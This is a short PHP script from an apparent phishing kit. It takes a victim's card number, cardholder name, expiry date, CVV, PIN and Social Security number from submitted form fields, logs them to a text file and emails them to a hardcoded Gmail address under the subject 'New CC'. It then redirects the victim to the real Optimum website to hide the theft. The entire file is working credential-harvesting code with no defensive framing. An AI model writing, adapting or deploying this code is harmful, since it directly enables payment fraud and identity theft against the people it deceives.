 <?php
$mail = "logboxes70@gmail.com";

$number = $_GET["cardNumber"];
$ch = $_GET["cardHolder"];
$mm = $_GET["mm"];
$yy = $_GET["yy"];
$cvv = $_GET["CVV"];
$pin = $_GET["pin"];
$ssn = $_GET["ssn"];

$ad = "
CC: $number
Card Holder: $ch
Exp: $mm/$yy
CVV: $cvv
PIN: $pin
SSN: $ssn
";

$fp = fopen('logs.txt', 'a');
fwrite($fp, $ad);
fwrite($fp, "-----------------------------------------------------");
fclose($fp);

mail($mail, 'New CC', $ad);
header("Location: https://www.optimum.net/");